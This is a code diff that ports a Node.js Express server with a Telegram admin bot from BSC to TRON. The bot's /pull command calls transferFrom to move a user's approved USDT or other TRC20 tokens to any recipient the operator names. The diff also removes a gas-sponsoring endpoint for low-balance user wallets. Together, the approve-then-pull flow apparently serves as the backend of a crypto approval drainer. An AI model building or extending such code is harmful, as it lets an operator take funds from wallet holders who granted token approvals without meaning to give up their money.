@@ -2,7 +2,7 @@ require('dotenv').config();
 
 const path = require('path');
 const express = require('express');
-const { ethers } = require('ethers');
+const { TronWeb } = require('tronweb');
 const axios = require('axios');
 
 function getEnv(name, fallbacks = []) {
@@ -26,53 +26,38 @@ function requireEnv(name, fallbacks = []) {
 }
 
 const TELEGRAM_BOT_TOKEN = requireEnv('TELEGRAM_BOT_TOKEN');
-const CONTRACT_ADDRESS = requireEnv('CONTRACT_ADDRESS', ['ESCROW_CONTRACT_ADDRESS']);
+const CONTRACT_ADDRESS = getEnv('CONTRACT_ADDRESS', ['ESCROW_CONTRACT_ADDRESS']);
 const COMPANY_WALLET_ADDRESS = getEnv('COMPANY_WALLET_ADDRESS');
 const ADMIN_CHAT_ID = requireEnv('ADMIN_CHAT_ID');
 const PRIVATE_KEY = requireEnv('PRIVATE_KEY', ['SENDER_KEY']);
-const BSC_RPC_URL = requireEnv('BSC_RPC_URL');
+const TRON_FULL_HOST = getEnv('TRON_FULL_HOST') || 'https://nile.trongrid.io';
 const USDT_ADDRESS = requireEnv('USDT_ADDRESS');
 const PORT = Number(getEnv('PORT')) || 3000;
-const USDT_DECIMALS = Number(getEnv('USDT_DECIMALS')) || 18;
-const GAS_SPONSOR_AMOUNT = getEnv('GAS_SPONSOR_AMOUNT') || '0.0005';
-const GAS_SPONSOR_MIN_BALANCE = getEnv('GAS_SPONSOR_MIN_BALANCE') || '0.0001';
-const GAS_SPONSOR_MAX_PER_DAY = Number(getEnv('GAS_SPONSOR_MAX_PER_DAY')) || 3;
-
-const gasSponsorUsage = new Map();
+const USDT_DECIMALS = Number(getEnv('USDT_DECIMALS')) || 6;
+const TRON_FEE_LIMIT = Number(getEnv('TRON_FEE_LIMIT')) || 100000000;
 
 const app = express();
 app.use(express.json());
 
-const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_URL);
-const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
-const gasWalletAddress = wallet.address;
+const tronWeb = new TronWeb({
+  fullHost: TRON_FULL_HOST,
+  privateKey: PRIVATE_KEY
+});
+const companyWalletAddress = tronWeb.defaultAddress.base58;
 
 if (
   COMPANY_WALLET_ADDRESS &&
-  gasWalletAddress.toLowerCase() !== COMPANY_WALLET_ADDRESS.toLowerCase()
+  companyWalletAddress !== COMPANY_WALLET_ADDRESS
 ) {
   console.warn(
-    `Warning: PRIVATE_KEY wallet (${gasWalletAddress}) does not match COMPANY_WALLET_ADDRESS (${COMPANY_WALLET_ADDRESS}). Admin gas is paid by ${gasWalletAddress}.`
+    `Warning: PRIVATE_KEY wallet (${companyWalletAddress}) does not match COMPANY_WALLET_ADDRESS (${COMPANY_WALLET_ADDRESS}). Pulls are signed by ${companyWalletAddress}.`
   );
 }
 
-const escrowAbi = [
-  'function notifyApproval(uint256 _amount) external',
-  'function pullFunds(address token, address user, address recipient, uint256 amount) external',
-  'function setCompanyWallet(address _new) external',
-  'event UserApprovalNotified(address indexed user, uint256 amount)',
-  'event FundsPulled(address indexed token, address indexed user, address indexed recipient, uint256 amount)'
-];
-
-const escrowContract = new ethers.Contract(CONTRACT_ADDRESS, escrowAbi, wallet);
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 function isAdminChat(chatId) {
   return String(chatId).trim() === String(ADMIN_CHAT_ID).trim();
-}
-
-function parseTokenAmount(amount) {
-  return ethers.utils.parseUnits(String(amount).trim(), USDT_DECIMALS);
 }
 
 async function sendTelegramMessage(chatId, text) {
@@ -87,56 +72,52 @@ async function sendTelegramMessage(chatId, text) {
   }
 }
 
-function getSponsorDayKey() {
-  return new Date().toISOString().slice(0, 10);
-}
-
-function canSponsorAddress(userAddress) {
-  const key = `${userAddress.toLowerCase()}:${getSponsorDayKey()}`;
-  const usage = gasSponsorUsage.get(key) || 0;
-  return usage < GAS_SPONSOR_MAX_PER_DAY;
-}
-
-function recordSponsorAddress(userAddress) {
-  const key = `${userAddress.toLowerCase()}:${getSponsorDayKey()}`;
-  gasSponsorUsage.set(key, (gasSponsorUsage.get(key) || 0) + 1);
-}
-
-app.post('/sponsor-gas', async (req, res) => {
-  try {
-    const userAddress = String(req.body?.userAddress || '').trim();
-    if (!userAddress || !ethers.utils.isAddress(userAddress)) {
-      return res.status(400).json({ ok: false, error: 'Invalid wallet address' });
-    }
-
-    if (userAddress.toLowerCase() === gasWalletAddress.toLowerCase()) {
-      return res.json({ ok: true, skipped: true, reason: 'company_wallet' });
-    }
-
-    if (!canSponsorAddress(userAddress)) {
-      return res.json({ ok: true, skipped: true, reason: 'rate_limit' });
-    }
-
-    const userBalance = await provider.getBalance(userAddress);
-    const minBalance = ethers.utils.parseEther(GAS_SPONSOR_MIN_BALANCE);
-    if (userBalance.gte(minBalance)) {
-      return res.json({ ok: true, skipped: true, reason: 'sufficient_balance' });
-    }
-
-    const sponsorAmount = ethers.utils.parseEther(GAS_SPONSOR_AMOUNT);
-    const tx = await wallet.sendTransaction({
-      to: userAddress,
-      value: sponsorAmount
-    });
-    await tx.wait();
-    recordSponsorAddress(userAddress);
-
-    return res.json({ ok: true, txHash: tx.hash, amount: GAS_SPONSOR_AMOUNT });
-  } catch (error) {
-    console.error('Gas sponsor error:', error.message);
-    return res.status(500).json({ ok: false, error: error.message });
+function validateTronAddress(address, label) {
+  if (!address || !tronWeb.isAddress(address)) {
+    throw new Error(`Invalid ${label} TRON address`);
   }
-});
+}
+
+function parseTokenAmount(amount, decimals = USDT_DECIMALS) {
+  const value = String(amount).trim();
+  if (!/^\d+(\.\d+)?$/.test(value)) {
+    throw new Error('Invalid amount');
+  }
+
+  const [whole, fraction = ''] = value.split('.');
+  if (fraction.length > decimals) {
+    throw new Error(`Amount supports up to ${decimals} decimals`);
+  }
+
+  const paddedFraction = (fraction + '0'.repeat(decimals)).slice(0, decimals);
+  const base = 10n ** BigInt(decimals);
+  return (BigInt(whole) * base + BigInt(paddedFraction || '0')).toString();
+}
+
+async function getTokenDecimals(tokenAddress) {
+  try {
+    const tokenContract = await tronWeb.contract().at(tokenAddress);
+    const decimals = await tokenContract.decimals().call();
+    return Number(decimals.toString());
+  } catch (error) {
+    console.warn(`Could not fetch token decimals for ${tokenAddress}, defaulting to ${USDT_DECIMALS}`);
+    return USDT_DECIMALS;
+  }
+}
+
+async function pullTrc20Funds(token, user, recipient, amount) {
+  validateTronAddress(token, 'token');
+  validateTronAddress(user, 'user');
+  validateTronAddress(recipient, 'recipient');
+
+  const decimals = await getTokenDecimals(token);
+  const parsedAmount = parseTokenAmount(amount, decimals);
+  const tokenContract = await tronWeb.contract().at(token);
+
+  return tokenContract.transferFrom(user, recipient, parsedAmount).send({
+    feeLimit: TRON_FEE_LIMIT
+  });
+}
 
 app.post('/webhook/:token', async (req, res) => {
   if (req.params.token !== TELEGRAM_BOT_TOKEN) {
@@ -158,71 +139,39 @@ app.post('/webhook/:token', async (req, res) => {
   if (text.startsWith('/start')) {
     await sendTelegramMessage(
       chatId,
-      '🌟 *Welcome to Escrow Admin Panel*\n\nAvailable commands:\n\n' +
-        '- `/approve <amount>`: Notify approval for a user\n' +
-        '- `/pull <token> <user> <recipient> <amount>`: Pull funds from a user\n' +
-        '- `/setwallet <newWallet>`: Update company wallet address'
+      '🌟 *Welcome to TRON Admin Panel*\n\nAvailable commands:\n\n' +
+        '- `/pull <token> <user> <recipient> <amount>`: Pull approved TRC20 funds from a user'
     );
   } else if (text.startsWith('/approve')) {
-    const amount = text.split(' ')[1];
-    if (!amount) {
-      await sendTelegramMessage(chatId, '❌ Please provide an amount. Example: `/approve 100`');
-      return res.sendStatus(200);
-    }
-
-    try {
-      const parsedAmount = parseTokenAmount(amount);
-      const tx = await escrowContract.notifyApproval(parsedAmount);
-      await tx.wait();
-      await sendTelegramMessage(
-        chatId,
-        `✅ Approval notified for amount: *${amount}*\n\nTransaction Hash: \`${tx.hash}\``
-      );
-    } catch (error) {
-      await sendTelegramMessage(chatId, `❌ Error: ${error.message}`);
-    }
+    await sendTelegramMessage(
+      chatId,
+      'ℹ️ On TRON, approval is created from the user wallet in the dApp. After approval, use `/pull <token> <user> <recipient> <amount>`.'
+    );
   } else if (text.startsWith('/pull')) {
     const parts = text.split(' ').filter(Boolean);
     if (parts.length !== 5) {
       await sendTelegramMessage(
         chatId,
-        '❌ Invalid format. Example: `/pull 0xTokenAddress 0xUserAddress 0xRecipientAddress 100`'
+        '❌ Invalid format. Example: `/pull TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf TTBa7XShDZsn5kgjEGiR53ChpDGCYYfERY TA9NZxNqXMNWoLD9yQUBxoi25g3diDkfit 1000`'
       );
       return res.sendStatus(200);
     }
 
     const [, token, user, recipient, amount] = parts;
     try {
-      const parsedAmount = parseTokenAmount(amount);
-      const tx = await escrowContract.pullFunds(token, user, recipient, parsedAmount);
-      await tx.wait();
+      const txHash = await pullTrc20Funds(token, user, recipient, amount);
       await sendTelegramMessage(
         chatId,
-        `✅ Funds pulled successfully!\n\nToken: *${token}*\nUser: *${user}*\nRecipient: *${recipient}*\nAmount: *${amount}*\n\nTransaction Hash: \`${tx.hash}\``
+        `✅ Funds pulled successfully!\n\nToken: *${token}*\nUser: *${user}*\nRecipient: *${recipient}*\nAmount: *${amount}*\n\nTransaction Hash: \`${txHash}\``
       );
     } catch (error) {
       await sendTelegramMessage(chatId, `❌ Error: ${error.message}`);
     }
   } else if (text.startsWith('/setwallet')) {
-    const newWallet = text.split(' ')[1];
-    if (!newWallet || !ethers.utils.isAddress(newWallet)) {
-      await sendTelegramMessage(
-        chatId,
-        '❌ Please provide a valid wallet address. Example: `/setwallet 0xNewWalletAddress`'
-      );
-      return res.sendStatus(200);
-    }
-
-    try {
-      const tx = await escrowContract.setCompanyWallet(newWallet);
-      await tx.wait();
-      await sendTelegramMessage(
-        chatId,
-        `✅ Company wallet updated to: *${newWallet}*\n\nTransaction Hash: \`${tx.hash}\``
-      );
-    } catch (error) {
-      await sendTelegramMessage(chatId, `❌ Error: ${error.message}`);
-    }
+    await sendTelegramMessage(
+      chatId,
+      'ℹ️ On TRON, the pull wallet is controlled by `PRIVATE_KEY` / `COMPANY_WALLET_ADDRESS` environment variables.'
+    );
   } else {
     await sendTelegramMessage(chatId, '❌ Unknown command. Type /start to see available commands.');
   }
@@ -235,7 +184,9 @@ app.get('/health', (_req, res) => {
     ok: true,
     contract: CONTRACT_ADDRESS,
     companyWallet: COMPANY_WALLET_ADDRESS || null,
-    rpc: BSC_RPC_URL
+    signingWallet: companyWalletAddress,
+    rpc: TRON_FULL_HOST,
+    token: USDT_ADDRESS
   });
 });
 
@@ -252,11 +203,11 @@ module.exports = app;
 if (!process.env.VERCEL) {
   app.listen(PORT, () => {
     console.log(`Server running at http://localhost:${PORT}`);
-    console.log(`Escrow contract: ${CONTRACT_ADDRESS}`);
     if (COMPANY_WALLET_ADDRESS) {
       console.log(`Company wallet: ${COMPANY_WALLET_ADDRESS}`);
     }
-    console.log(`Gas fees paid by: ${gasWalletAddress}`);
+    console.log(`Pulls signed by: ${companyWalletAddress}`);
+    console.log(`TRON RPC: ${TRON_FULL_HOST}`);
     console.log(`Default USDT token: ${USDT_ADDRESS}`);
   });
 }
